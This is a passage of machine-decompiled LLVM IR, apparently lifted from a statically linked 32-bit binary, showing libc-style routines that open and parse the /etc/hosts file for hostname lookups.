  %v2_805713c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805713c, i32* @ebx, align 4
  store i32 %v0_805704a, i32* @esi, align 4
  store i32 %v0_8057049, i32* @edi, align 4
  store i32 %v0_8057048, i32* @ebp, align 4
  ret i32 %v0_805713a

; uselistorder directives
  uselistorder i32 %v1_8057093, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805708b, { 1, 0, 2 }
  uselistorder i32 %v4_8057079, { 1, 0, 2, 3 }
  uselistorder i32 24, { 32, 33, 22, 0, 34, 35, 36, 23, 6, 11, 39, 12, 13, 14, 37, 24, 25, 26, 27, 28, 29, 30, 41, 3, 38, 15, 16, 17, 18, 19, 20, 21, 4, 5, 7, 8, 9, 2, 10, 31, 1, 40 }
  uselistorder i32 20, { 37, 38, 39, 40, 6, 23, 44, 9, 45, 41, 42, 7, 24, 25, 5, 12, 13, 36, 14, 15, 16, 26, 27, 28, 0, 29, 1, 30, 10, 31, 32, 47, 43, 8, 17, 18, 19, 20, 21, 22, 33, 34, 35, 4, 3, 46, 11, 2 }
  uselistorder i32 9, { 19, 20, 21, 22, 9, 23, 13, 14, 5, 12, 3, 10, 15, 16, 17, 18, 8, 11, 6, 7, 1, 0, 24, 4, 25, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9 }
  uselistorder i32 3, { 58, 59, 60, 61, 62, 63, 26, 3, 27, 16, 57, 7, 64, 28, 9, 8, 4, 1, 2, 0, 29, 5, 30, 49, 17, 50, 36, 37, 38, 39, 40, 41, 65, 18, 19, 42, 31, 15, 11, 12, 10, 13, 32, 48, 43, 34, 55, 35, 56, 33, 44, 45, 20, 46, 21, 47, 51, 52, 53, 54, 14, 22, 23, 24, 25, 6 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8057134, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8057151 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805ab45.575 to i32), i32 ptrtoint (i32* @global_var_805ab10.563 to i32))
  store i32 %v3_8057151, i32* @eax, align 4
  %v1_8057159 = icmp eq i32 %v3_8057151, 0
  %v1_805715b = icmp eq i1 %v1_8057159, false
  br i1 %v1_805715b, label %dec_label_pc_8057171, label %dec_label_pc_805715d

dec_label_pc_805715d:                             ; preds = %entry
  %v3_8057169 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805ab50.576 to i32), i32 ptrtoint (i32* @global_var_805ab10.563 to i32))
  br label %dec_label_pc_8057171

dec_label_pc_8057171:                             ; preds = %entry, %dec_label_pc_805715d
  %v0_8057174 = phi i32 [ %v3_8057151, %entry ], [ %v3_8057169, %dec_label_pc_805715d ]
  ret i32 %v0_8057174

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805ab10.563 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8057171, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8057175 = load i32, i32* @ebp, align 4
  %v0_8057176 = load i32, i32* @edi, align 4
  %v0_8057177 = load i32, i32* @esi, align 4
  %v0_8057178 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8057186 = sub i32 0, %arg6
  %v1_8057188 = urem i32 %v1_8057186, 4
  %v2_8057188 = icmp eq i32 %v1_8057188, 0
  store i32 %v1_8057188, i32* %eax.global-to-local, align 4
  br i1 %v2_8057188, label %dec_label_pc_8057199, label %dec_label_pc_805718d

dec_label_pc_805718d:                             ; preds = %entry
  %v2_805718d = sub i32 %arg7, %v1_8057188
  %v7_805718d = icmp ugt i32 %v1_8057188, %arg7
  br i1 %v7_805718d, label %dec_label_pc_805743d, label %dec_label_pc_8057195

dec_label_pc_8057195:                             ; preds = %dec_label_pc_805718d
  %v2_8057195 = add i32 %v1_8057188, %arg6
  store i32 %v2_8057195, i32* @ebx, align 4
  store i32 %v2_805718d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057199

dec_label_pc_8057199:                             ; preds = %entry, %dec_label_pc_8057195
  %v0_80571a2 = phi i32 [ %arg6, %entry ], [ %v2_8057195, %dec_label_pc_8057195 ]
  %v0_80571a5 = phi i32 [ %arg7, %entry ], [ %v2_805718d, %dec_label_pc_8057195 ]
  %tmp149 = icmp ult i32 %v0_80571a5, 32
  br i1 %tmp149, label %dec_label_pc_805743d, label %dec_label_pc_80571a2

dec_label_pc_80571a2:                             ; preds = %dec_label_pc_8057199
  %v1_80571a2 = add i32 %v0_80571a2, 32
  store i32 %v1_80571a2, i32* %eax.global-to-local, align 4
  %v1_80571a5 = add i32 %v0_80571a5, -32
  store i32 %v1_80571a5, i32* @ebp, align 4
  %v5_80571a8 = inttoptr i32 %v1_80571a2 to i8*
  %v12_80571ac = icmp eq i32 %arg4, 1
  br i1 %v12_80571ac, label %dec_label_pc_80572ce, label %dec_label_pc_80571b7

dec_label_pc_80571b7:                             ; preds = %dec_label_pc_80571a2
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80571be = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80571be, align 4
  %tmp150 = icmp ult i32 %v1_80571a5, 4
  br i1 %tmp150, label %dec_label_pc_805743d, label %dec_label_pc_80571ca

dec_label_pc_80571ca:                             ; preds = %dec_label_pc_80571b7
  %v0_80571ca = load i32, i32* %edx.global-to-local, align 4
  %v1_80571ca = add i32 %v0_80571ca, -36
  store i32 %v1_80571ca, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_80571ca, 8
  br i1 %tmp151, label %dec_label_pc_805743d, label %dec_label_pc_80571d6

dec_label_pc_80571d6:                             ; preds = %dec_label_pc_80571ca
  %v0_80571d6 = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_80571d6, 16
  br i1 %tmp152, label %dec_label_pc_805743d, label %dec_label_pc_80571df

dec_label_pc_80571df:                             ; preds = %dec_label_pc_80571d6
  %v1_80571df = add i32 %v0_80571ca, -48
  store i32 %v1_80571df, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_80571df, 8
  br i1 %tmp153, label %dec_label_pc_805743d, label %dec_label_pc_80571eb

dec_label_pc_80571eb:                             ; preds = %dec_label_pc_80571df
  %v0_80571eb = load i32, i32* @ebx, align 4
  %v1_80571eb = add i32 %v0_80571eb, 48
  %v1_80571ee = add i32 %v0_80571ca, -44
  store i32 %v1_80571ee, i32* @ebp, align 4
  %v1_80571f5 = add i32 %v0_80571ca, -56
  store i32 %v1_80571f5, i32* @eax, align 4
  %v1_80571f8 = add i32 %v0_80571eb, 36
  store i32 %v1_80571f8, i32* @edi, align 4
  %v7_80571fb = icmp ult i32 %v1_80571f5, %v1_80571ee
  br i1 %v7_80571fb, label %dec_label_pc_8057204, label %dec_label_pc_80571ff

dec_label_pc_80571ff:                             ; preds = %dec_label_pc_80571eb
  %v1_80571ff = add i32 %v0_80571eb, 44
  store i32 %v1_80571ff, i32* @esi, align 4
  br label %dec_label_pc_8057209

dec_label_pc_8057204:                             ; preds = %dec_label_pc_80571eb
  %v1_8057204 = add i32 %v0_80571eb, 56
  store i32 %v1_8057204, i32* @esi, align 4
  store i32 %v1_80571f5, i32* @ebp, align 4
  br label %dec_label_pc_8057209

dec_label_pc_8057209:                             ; preds = %dec_label_pc_80571ff, %dec_label_pc_8057204
  %v0_8057209 = phi i32 [ %v1_80571ee, %dec_label_pc_80571ff ], [ %v1_80571f5, %dec_label_pc_8057204 ]
  %tmp154 = icmp ult i32 %v0_8057209, 80
  br i1 %tmp154, label %dec_label_pc_805743d, label %dec_label_pc_8057212

dec_label_pc_8057212:                             ; preds = %dec_label_pc_8057209
  %v0_8057212 = call i32 @__open_etc_hosts()
  store i32 %v0_8057212, i32* %eax.global-to-local, align 4
  %v1_805721b = icmp eq i32 %v0_8057212, 0
  br i1 %v1_805721b, label %dec_label_pc_805723f, label %dec_label_pc_805721f

dec_label_pc_805721f:                             ; preds = %dec_label_pc_8057212
  store i32 %v1_80571a2, i32* %edx.global-to-local, align 4
  store i32 %v1_80571eb, i32* %eax.global-to-local, align 4
  store i8* %v5_80571a8, i8** %stack_var_-44, align 4
  %v0_805722a = load i32, i32* @edi, align 4
  %v0_8057236 = load i32, i32* @esi, align 4
  %v5_8057236 = inttoptr i32 %v0_8057236 to i8*
  br label %dec_label_pc_80572ed

dec_label_pc_805723f:                             ; preds = %dec_label_pc_8057212
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8057243 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8057243, align 4
  %v1_8057249 = call i32 @__errno_location(i32 0)
  store i32 %v1_8057249, i32* %eax.global-to-local, align 4
  %v1_805724e = inttoptr i32 %v1_8057249 to i32*
  %v2_805724e = load i32, i32* %v1_805724e, align 4
  store i32 %v2_805724e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805743d

dec_label_pc_8057259:                             ; preds = %dec_label_pc_80573c0
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_805725d = load i8*, i8** %stack_var_-44, align 4
  %v3_805725d = ptrtoint i8* %v2_805725d to i32
  %v2_8057260 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_805725d, i32* %v2_8057260, align 4
  %v0_8057262 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057262 = add i32 %v0_8057262, 4
  %v2_8057262 = inttoptr i32 %v1_8057262 to i32*
  store i32 0, i32* %v2_8057262, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_805726d = load i32, i32* @ebx, align 4
  %v1_805726d = add i32 %v0_805726d, 4
  %v2_805726d = inttoptr i32 %v1_805726d to i32*
  %v3_805726d = load i32, i32* %v2_805726d, align 4
  store i32 %v3_805726d, i32* %eax.global-to-local, align 4
  store i32 %v3_805726d, i32* %arg5, align 4
  %v0_8057272 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057272 = add i32 %v0_8057272, 8
  %v2_8057272 = inttoptr i32 %v1_8057272 to i32*
  store i32 2, i32* %v2_8057272, align 4
  %v0_8057279 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057279 = add i32 %v0_8057279, 12
  %v2_8057279 = inttoptr i32 %v1_8057279 to i32*
  store i32 4, i32* %v2_8057279, align 4
  br label %dec_label_pc_80572b2

dec_label_pc_8057286:                             ; preds = %dec_label_pc_80573e2
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_805728e = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805728e, align 4
  %v0_8057290 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057290 = add i32 %v0_8057290, 4
  %v2_8057290 = inttoptr i32 %v1_8057290 to i32*
  store i32 0, i32* %v2_8057290, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_805729b = load i32, i32* @ebx, align 4
  %v1_805729b = add i32 %v0_805729b, 4
  %v2_805729b = inttoptr i32 %v1_805729b to i32*
  %v3_805729b = load i32, i32* %v2_805729b, align 4
  store i32 %v3_805729b, i32* %eax.global-to-local, align 4
  store i32 %v3_805729b, i32* %arg5, align 4
  %v0_80572a0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80572a0 = add i32 %v0_80572a0, 8
  %v2_80572a0 = inttoptr i32 %v1_80572a0 to i32*
  store i32 10, i32* %v2_80572a0, align 4
  %v0_80572a7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80572a7 = add i32 %v0_80572a7, 12
  %v2_80572a7 = inttoptr i32 %v1_80572a7 to i32*
  store i32 16, i32* %v2_80572a7, align 4
  br label %dec_label_pc_80572b2

dec_label_pc_80572b2:                             ; preds = %dec_label_pc_8057259, %dec_label_pc_8057286
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8057259 ], [ %stack_var_-32.0, %dec_label_pc_8057286 ]
  %v1_80572b2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80572b2 = add i32 %v1_80572b2, 16
  %v3_80572b2 = inttoptr i32 %v2_80572b2 to i32*
  store i32 %storemerge, i32* %v3_80572b2, align 4
  %v0_80572b5 = load i32, i32* @ebx, align 4
  %v1_80572b5 = add i32 %v0_80572b5, 8
  %v1_80572b8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80572b8 = add i32 %v1_80572b8, 4
  %v3_80572b8 = inttoptr i32 %v2_80572b8 to i32*
  store i32 %v1_80572b5, i32* %v3_80572b8, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80572bf = load i32, i32* %edx.global-to-local, align 4
  %v2_80572bf = inttoptr i32 %arg8 to i32*
  store i32 %v0_80572bf, i32* %v2_80572bf, align 4
  br label %dec_label_pc_805741d

dec_label_pc_80572ce:                             ; preds = %dec_label_pc_80571a2
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80572ed

dec_label_pc_80572ed:                             ; preds = %dec_label_pc_805721f, %dec_label_pc_80572ce
  %v1_80572f1.pre-phi = phi i32* [ %v1_80571be, %dec_label_pc_805721f ], [ %.pre, %dec_label_pc_80572ce ]
  %stack_var_-32.0 = phi i32 [ %v1_80571eb, %dec_label_pc_805721f ], [ 0, %dec_label_pc_80572ce ]
  %stack_var_-36.0 = phi i32 [ %v1_80571a2, %dec_label_pc_805721f ], [ 0, %dec_label_pc_80572ce ]
  %stack_var_-40.0 = phi i32 [ %v0_805722a, %dec_label_pc_805721f ], [ 0, %dec_label_pc_80572ce ]
  %stack_var_4.0 = phi i32 [ %v0_8057212, %dec_label_pc_805721f ], [ %arg1, %dec_label_pc_80572ce ]
  %stack_var_-20.0 = phi i8* [ %v5_8057236, %dec_label_pc_805721f ], [ %v5_80571a8, %dec_label_pc_80572ce ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80572f1.pre-phi, align 4
  %v4_8057409 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_80573a6 = inttoptr i32 %arg2 to i8*
  %v0_8057403120127 = load i32, i32* @edx, align 4
  %v3_805740d121128 = call i32 @fgets(i32 %v4_8057409, i32 %stack_var_4.0, i32 %v0_8057403120127)
  store i32 %v3_805740d121128, i32* @eax, align 4
  %v1_8057415122129 = icmp eq i32 %v3_805740d121128, 0
  %v1_8057417123130 = icmp eq i1 %v1_8057415122129, false
  br i1 %v1_8057417123130, label %dec_label_pc_8057304.lr.ph.lr.ph, label %dec_label_pc_805741d

dec_label_pc_8057304.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80572ed
  %v12_80573db = icmp eq i32 %arg3, 10
  %v12_80573b9 = icmp eq i32 %arg3, 2
  %v12_8057380 = icmp eq i32 %arg4, 2
  %v1_8057385 = icmp eq i1 %v12_8057380, false
  %v1_80573be = icmp eq i1 %v12_80573b9, false
  %v1_80573e0 = icmp eq i1 %v12_80573db, false
  br label %dec_label_pc_8057304.lr.ph

dec_label_pc_8057304.lr.ph:                       ; preds = %dec_label_pc_8057304.lr.ph.lr.ph, %dec_label_pc_8057403.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_8057304.lr.ph.lr.ph ], [ 2, %dec_label_pc_8057403.outer.backedge ]
  br label %dec_label_pc_8057304

dec_label_pc_8057304:                             ; preds = %dec_label_pc_8057304.lr.ph, %dec_label_pc_8057403.backedge
  %v3_805730c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_805730c, i32* @eax, align 4
  %v1_8057314 = icmp eq i32 %v3_805730c, 0
  br i1 %v1_8057314, label %dec_label_pc_805731b, label %dec_label_pc_8057318

dec_label_pc_8057318:                             ; preds = %dec_label_pc_8057304
  %v1_8057318 = inttoptr i32 %v3_805730c to i8*
  store i8 0, i8* %v1_8057318, align 1
  br label %dec_label_pc_805731b

dec_label_pc_805731b:                             ; preds = %dec_label_pc_8057304, %dec_label_pc_8057318
  store i32 %v4_8057409, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805735b32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805735b33 = icmp eq i8 %v2_805735b32, 0
  %v1_805735e39 = icmp eq i1 %v3_805735b33, false
  br i1 %v1_805735e39, label %dec_label_pc_8057327.preheader.preheader, label %dec_label_pc_8057360

dec_label_pc_8057327.preheader.preheader:         ; preds = %dec_label_pc_805731b
  %v4_805732797.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057327.preheader

dec_label_pc_8057323:                             ; preds = %dec_label_pc_805732d
  store i8 0, i8* %v1_8057327102, align 1
  %v0_8057326 = load i32, i32* @ecx, align 4
  %v1_8057326 = add i32 %v0_8057326, 1
  store i32 %v1_8057326, i32* @ecx, align 4
  %v1_8057327 = inttoptr i32 %v1_8057326 to i8*
  %v2_8057327 = load i8, i8* %v1_8057327, align 1
  %v3_8057327 = zext i8 %v2_8057327 to i32
  %v4_8057327 = load i32, i32* %eax.global-to-local, align 4
  %v5_8057327 = and i32 %v4_8057327, -256
  %v6_8057327 = or i32 %v5_8057327, %v3_8057327
  store i32 %v6_8057327, i32* @eax, align 4
  %v4_8057329 = icmp eq i8 %v2_8057327, 0
  br i1 %v4_8057329, label %dec_label_pc_8057327.dec_label_pc_8057360.loopexit_crit_edge, label %dec_label_pc_805732d

dec_label_pc_805732d:                             ; preds = %dec_label_pc_8057327.preheader, %dec_label_pc_8057323
  %v2_8057327103 = phi i8 [ %v2_8057327, %dec_label_pc_8057323 ], [ %v2_805732795, %dec_label_pc_8057327.preheader ]
  %v1_8057327102 = phi i8* [ %v1_8057327, %dec_label_pc_8057323 ], [ %v1_805732794, %dec_label_pc_8057327.preheader ]
  %v0_8057323101 = phi i32 [ %v1_8057326, %dec_label_pc_8057323 ], [ %v0_805732747, %dec_label_pc_8057327.preheader ]
  %v2_805732d = sext i8 %v2_8057327103 to i32
  store i32 %v2_805732d, i32* @edx, align 4
  %v0_8057330 = load i32, i32* @global_var_805b278, align 8
  store i32 %v0_8057330, i32* %eax.global-to-local, align 4
  %v2_8057335 = mul nsw i32 %v2_805732d, 2
  %v3_8057335 = add i32 %v0_8057330, %v2_8057335
  %v4_8057335 = inttoptr i32 %v3_8057335 to i8*
  %v5_8057335 = load i8, i8* %v4_8057335, align 1
  %v6_8057335 = and i8 %v5_8057335, 32
  %v7_8057335 = icmp eq i8 %v6_8057335, 0
  %v1_8057339 = icmp eq i1 %v7_8057335, false
  br i1 %v1_8057339, label %dec_label_pc_8057323, label %dec_label_pc_805733b

dec_label_pc_805733b:                             ; preds = %dec_label_pc_805732d
  %v0_805733b = load i32, i32* @edi, align 4
  %v1_805733b = add i32 %v0_805733b, -6
  %v6_805733b = sub i32 5, %v0_805733b
  %v7_805733b = and i32 %v6_805733b, %v0_805733b
  %v8_805733b = icmp slt i32 %v7_805733b, 0
  %v9_805733b = icmp eq i32 %v1_805733b, 0
  %v10_805733b = icmp slt i32 %v1_805733b, 0
  %v3_805733e = icmp eq i1 %v10_805733b, %v8_805733b
  %v4_805733e = icmp eq i1 %v9_805733b, false
  %v5_805733e = and i1 %v4_805733e, %v3_805733e
  br i1 %v5_805733e, label %dec_label_pc_8057347.preheader, label %dec_label_pc_8057340

dec_label_pc_8057340:                             ; preds = %dec_label_pc_805733b
  %v1_8057340 = load i32, i32* @ebx, align 4
  %v3_8057340 = mul i32 %v0_805733b, 4
  %v4_8057340 = add i32 %v1_8057340, %v3_8057340
  %v5_8057340 = inttoptr i32 %v4_8057340 to i32*
  store i32 %v0_8057323101, i32* %v5_8057340, align 4
  %v0_8057343 = load i32, i32* @edi, align 4
  %v1_8057343 = add i32 %v0_8057343, 1
  store i32 %v1_8057343, i32* @edi, align 4
  %v0_8057347.pre.pre = load i32, i32* @ecx, align 4
  %v4_8057347.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057347.preheader

dec_label_pc_8057347.preheader:                   ; preds = %dec_label_pc_8057340, %dec_label_pc_805733b
  %v4_8057347.pre = phi i32 [ %v4_8057347.pre.pre, %dec_label_pc_8057340 ], [ %v0_8057330, %dec_label_pc_805733b ]
  %v0_8057347.pre = phi i32 [ %v0_8057347.pre.pre, %dec_label_pc_8057340 ], [ %v0_8057323101, %dec_label_pc_805733b ]
  %v1_805736052 = phi i32 [ %v1_8057343, %dec_label_pc_8057340 ], [ %v0_805733b, %dec_label_pc_805733b ]
  %v1_8057347104 = inttoptr i32 %v0_8057347.pre to i8*
  %v2_8057347105 = load i8, i8* %v1_8057347104, align 1
  %v3_8057347106 = zext i8 %v2_8057347105 to i32
  %v5_8057347107 = and i32 %v4_8057347.pre, -256
  %v6_8057347108 = or i32 %v3_8057347106, %v5_8057347107
  store i32 %v6_8057347108, i32* @eax, align 4
  %v4_8057349109 = icmp eq i8 %v2_8057347105, 0
  br i1 %v4_8057349109, label %dec_label_pc_805735b.loopexit, label %dec_label_pc_805734d.lr.ph

dec_label_pc_805734d.lr.ph:                       ; preds = %dec_label_pc_8057347.preheader
  %v0_8057350.pre = load i32, i32* @global_var_805b278, align 8
  br label %dec_label_pc_805734d

dec_label_pc_8057346:                             ; preds = %dec_label_pc_805734d
  %v1_8057346 = add i32 %v0_805735b110, 1
  store i32 %v1_8057346, i32* @ecx, align 4
  %v1_8057347 = inttoptr i32 %v1_8057346 to i8*
  %v2_8057347 = load i8, i8* %v1_8057347, align 1
  %v3_8057347 = zext i8 %v2_8057347 to i32
  %v5_8057347 = and i32 %v0_8057350.pre, -256
  %v6_8057347 = or i32 %v3_8057347, %v5_8057347
  store i32 %v6_8057347, i32* @eax, align 4
  %v4_8057349 = icmp eq i8 %v2_8057347, 0
  br i1 %v4_8057349, label %dec_label_pc_805735b.loopexit, label %dec_label_pc_805734d

dec_label_pc_805734d:                             ; preds = %dec_label_pc_805734d.lr.ph, %dec_label_pc_8057346
  %v2_8057347112 = phi i8 [ %v2_8057347105, %dec_label_pc_805734d.lr.ph ], [ %v2_8057347, %dec_label_pc_8057346 ]
  %v1_8057347111 = phi i8* [ %v1_8057347104, %dec_label_pc_805734d.lr.ph ], [ %v1_8057347, %dec_label_pc_8057346 ]
  %v0_805735b110 = phi i32 [ %v0_8057347.pre, %dec_label_pc_805734d.lr.ph ], [ %v1_8057346, %dec_label_pc_8057346 ]
  %v2_805734d = sext i8 %v2_8057347112 to i32
  store i32 %v2_805734d, i32* @edx, align 4
  store i32 %v0_8057350.pre, i32* @eax, align 4
  %v2_8057355 = mul nsw i32 %v2_805734d, 2
  %v3_8057355 = add i32 %v0_8057350.pre, %v2_8057355
  %v4_8057355 = inttoptr i32 %v3_8057355 to i8*
  %v5_8057355 = load i8, i8* %v4_8057355, align 1
  %v6_8057355 = and i8 %v5_8057355, 32
  %v7_8057355 = icmp eq i8 %v6_8057355, 0
  br i1 %v7_8057355, label %dec_label_pc_8057346, label %dec_label_pc_805735b.loopexit

dec_label_pc_805735b.loopexit:                    ; preds = %dec_label_pc_805734d, %dec_label_pc_8057346, %dec_label_pc_8057347.preheader
  %v4_805732797144 = phi i32 [ %v6_8057347108, %dec_label_pc_8057347.preheader ], [ %v6_8057347, %dec_label_pc_8057346 ], [ %v0_8057350.pre, %dec_label_pc_805734d ]
  %v0_805735b.lcssa = phi i32 [ %v0_8057347.pre, %dec_label_pc_8057347.preheader ], [ %v1_8057346, %dec_label_pc_8057346 ], [ %v0_805735b110, %dec_label_pc_805734d ]
  %v1_8057347.lcssa = phi i8* [ %v1_8057347104, %dec_label_pc_8057347.preheader ], [ %v1_8057347, %dec_label_pc_8057346 ], [ %v1_8057347111, %dec_label_pc_805734d ]
  %v2_805735b = load i8, i8* %v1_8057347.lcssa, align 1
  %v3_805735b = icmp eq i8 %v2_805735b, 0
  %v1_805735e = icmp eq i1 %v3_805735b, false
  br i1 %v1_805735e, label %dec_label_pc_8057327.preheader, label %dec_label_pc_8057360

dec_label_pc_8057327.preheader:                   ; preds = %dec_label_pc_8057327.preheader.preheader, %dec_label_pc_805735b.loopexit
  %v1_8057360.pre147 = phi i32 [ %v1_805736052, %dec_label_pc_805735b.loopexit ], [ 0, %dec_label_pc_8057327.preheader.preheader ]
  %v4_805732797 = phi i32 [ %v4_805732797144, %dec_label_pc_805735b.loopexit ], [ %v4_805732797.pre, %dec_label_pc_8057327.preheader.preheader ]
  %v0_805732747 = phi i32 [ %v0_805735b.lcssa, %dec_label_pc_805735b.loopexit ], [ %v4_8057409, %dec_label_pc_8057327.preheader.preheader ]
  %v1_805732794 = inttoptr i32 %v0_805732747 to i8*
  %v2_805732795 = load i8, i8* %v1_805732794, align 1
  %v3_805732796 = zext i8 %v2_805732795 to i32
  %v5_805732798 = and i32 %v4_805732797, -256
  %v6_805732799 = or i32 %v5_805732798, %v3_805732796
  store i32 %v6_805732799, i32* @eax, align 4
  %v4_8057329100 = icmp eq i8 %v2_805732795, 0
  br i1 %v4_8057329100, label %dec_label_pc_8057360, label %dec_label_pc_805732d

dec_label_pc_8057327.dec_label_pc_8057360.loopexit_crit_edge: ; preds = %dec_label_pc_8057323
  %v1_8057360.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057360

dec_label_pc_8057360:                             ; preds = %dec_label_pc_805735b.loopexit, %dec_label_pc_8057327.dec_label_pc_8057360.loopexit_crit_edge, %dec_label_pc_8057327.preheader, %dec_label_pc_805731b
  %v1_8057360 = phi i32 [ 0, %dec_label_pc_805731b ], [ %v1_8057360.pre.pre, %dec_label_pc_8057327.dec_label_pc_8057360.loopexit_crit_edge ], [ %v1_8057360.pre147, %dec_label_pc_8057327.preheader ], [ %v1_805736052, %dec_label_pc_805735b.loopexit ]
  %v0_8057360 = load i32, i32* @ebx, align 4
  %v2_8057360 = mul i32 %v1_8057360, 4
  %v3_8057360 = add i32 %v2_8057360, %v0_8057360
  %v4_8057360 = inttoptr i32 %v3_8057360 to i32*
  store i32 0, i32* %v4_8057360, align 4
  %v0_8057367 = load i32, i32* @edi, align 4
  %v7_805736a = icmp sgt i32 %v0_8057367, 1
  br i1 %v7_805736a, label %dec_label_pc_8057370, label %dec_label_pc_8057403.backedge

dec_label_pc_8057370:                             ; preds = %dec_label_pc_8057360
  br i1 %v12_80571ac, label %dec_label_pc_805743d, label %dec_label_pc_805737b

dec_label_pc_805737b:                             ; preds = %dec_label_pc_8057370
  store i32 1, i32* @esi, align 4
  br i1 %v1_8057385, label %dec_label_pc_805739d.lr.ph, label %dec_label_pc_8057387

dec_label_pc_805739d.lr.ph:                       ; preds = %dec_label_pc_805737b
  br label %dec_label_pc_805739d

dec_label_pc_8057387:                             ; preds = %dec_label_pc_805737b
  %v0_8057387 = load i32, i32* @eax, align 4
  %v0_8057389 = load i32, i32* @ebx, align 4
  %v1_8057389 = inttoptr i32 %v0_8057389 to i32*
  %v2_8057389 = load i32, i32* %v1_8057389, align 4
  %v5_805738f = call i32 @__GI_strcoll(i8* %v2_80573a6, i32 %v2_8057389, i32 %v0_8057387, i32 %v0_8057387)
  store i32 %v5_805738f, i32* %eax.global-to-local, align 4
  %v1_8057397 = icmp eq i32 %v5_805738f, 0
  %v1_8057399 = icmp eq i1 %v1_8057397, false
  br i1 %v1_8057399, label %dec_label_pc_8057403.backedge, label %dec_label_pc_80573b9

dec_label_pc_8057403.backedge:                    ; preds = %dec_label_pc_80573b2, %dec_label_pc_8057387, %dec_label_pc_8057360
  %v0_8057403 = load i32, i32* @edx, align 4
  %v3_805740d = call i32 @fgets(i32 %v4_8057409, i32 %stack_var_4.0, i32 %v0_8057403)
  store i32 %v3_805740d, i32* @eax, align 4
  %v1_8057415 = icmp eq i32 %v3_805740d, 0
  %v1_8057417 = icmp eq i1 %v1_8057415, false
  br i1 %v1_8057417, label %dec_label_pc_8057304, label %dec_label_pc_805741d

dec_label_pc_805739d:                             ; preds = %dec_label_pc_805739d.lr.ph, %dec_label_pc_80573b2
  %v1_805739f119 = phi i32 [ 1, %dec_label_pc_805739d.lr.ph ], [ %v1_80573b2, %dec_label_pc_80573b2 ]
  %v0_805739f = load i32, i32* @ebx, align 4
  %v2_805739f = mul i32 %v1_805739f119, 4
  %v3_805739f = add i32 %v0_805739f, %v2_805739f
  %v4_805739f = inttoptr i32 %v3_805739f to i32*
  %v5_805739f = load i32, i32* %v4_805739f, align 4
  %v3_80573a6 = call i32 @__GI_strcasecmp(i8* %v2_80573a6, i32 %v5_805739f)
  store i32 %v3_80573a6, i32* %eax.global-to-local, align 4
  %v1_80573ae = icmp eq i32 %v3_80573a6, 0
  br i1 %v1_80573ae, label %dec_label_pc_80573b9, label %dec_label_pc_80573b2

dec_label_pc_80573b2:                             ; preds = %dec_label_pc_805739d
  %v0_80573b2 = load i32, i32* @esi, align 4
  %v1_80573b2 = add i32 %v0_80573b2, 1
  store i32 %v1_80573b2, i32* @esi, align 4
  %v1_80573b3.pre = load i32, i32* @edi, align 4
  %v5_80573b5 = icmp slt i32 %v1_80573b2, %v1_80573b3.pre
  br i1 %v5_80573b5, label %dec_label_pc_805739d, label %dec_label_pc_8057403.backedge

